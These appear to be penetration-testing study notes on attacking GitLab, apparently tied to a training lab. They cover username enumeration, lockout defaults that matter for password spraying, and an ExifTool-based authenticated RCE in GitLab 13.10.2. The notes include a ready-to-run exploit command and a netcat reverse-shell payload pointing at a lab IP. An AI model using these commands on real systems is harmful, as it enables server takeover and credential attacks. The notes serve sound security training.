
# Attacking GitLab

GitLab had **553 reported CVEs (September 2021)**. Several of these vulnerabilities could lead to **Remote Code Execution (RCE)**. Even unauthenticated access may expose sensitive information, while authenticated access can allow attackers to compromise repositories, CI/CD pipelines, and sometimes the underlying server.

---

# 1. Username Enumeration

## What is it?

Username enumeration is the process of identifying valid GitLab usernames by observing differences in the server's responses during login.

> GitLab does **not** consider username enumeration a vulnerability unless it leads to additional impact (according to its HackerOne policy).

---

## Why is it useful?

After identifying valid usernames, an attacker can perform:

- Password spraying
    
- Credential reuse (from leaked passwords)
    
- Credential guessing
    

instead of guessing both usernames and passwords.

---

## Account Lockout (Important)

For **GitLab versions below 16.6**, the default settings are:

```ruby
# Number of authentication tries before locking an account
config.maximum_attempts = 10

# Unlock time
config.unlock_in = 10.minutes
```

Meaning:

- 10 failed login attempts
    
- Account locked
    
- Automatically unlocks after 10 minutes
    

From **GitLab 16.6**, administrators can configure:

- `max_login_attempts`
    
- `failed_login_attempts_unlock_period_in_minutes`
    

through the Admin UI.

If not changed, the defaults remain:

- **10 failed attempts**
    
- **10-minute unlock period**

# 2. Authenticated Remote Code Execution (RCE)

## Vulnerable Version

**GitLab Community Edition 13.10.2 and earlier**

---

## Cause

GitLab used **ExifTool** to process uploaded image metadata.

A specially crafted image containing malicious metadata could execute arbitrary commands, resulting in **Authenticated Remote Code Execution**.

---

## Requirements

- Valid username
    
- Valid password
    
- Vulnerable GitLab version
    

If **self-registration** is enabled, an attacker can simply create an account and exploit the vulnerability.

---
- rce : https://www.exploit-db.com/exploits/49951
## Exploit

```bash
python3 gitlab_13_10_2_rce.py \
-t http://gitlab.inlanefreight.local:8081 \
-u mrb3n \
-p password1 \
-c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```

### Options

| Option | Description        |
| ------ | ------------------ |
| `-t`   | Target GitLab URL  |
| `-u`   | Username           |
| `-p`   | Password           |
| `-c`   | Command to execute |

---

## Reverse Shell Payload

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f
```

### Purpose

|Command|Description|
|---|---|
|`rm /tmp/f`|Remove existing FIFO file|
|`mkfifo /tmp/f`|Create a named pipe|
|`cat /tmp/f`|Read commands from the pipe|
|`/bin/bash -i`|Start an interactive Bash shell|
|`2>&1`|Redirect stderr to stdout|
|`nc 10.10.14.15 8443`|Connect back to the attacker's Netcat listener|
|`>/tmp/f`|Redirect output back through the named pipe|

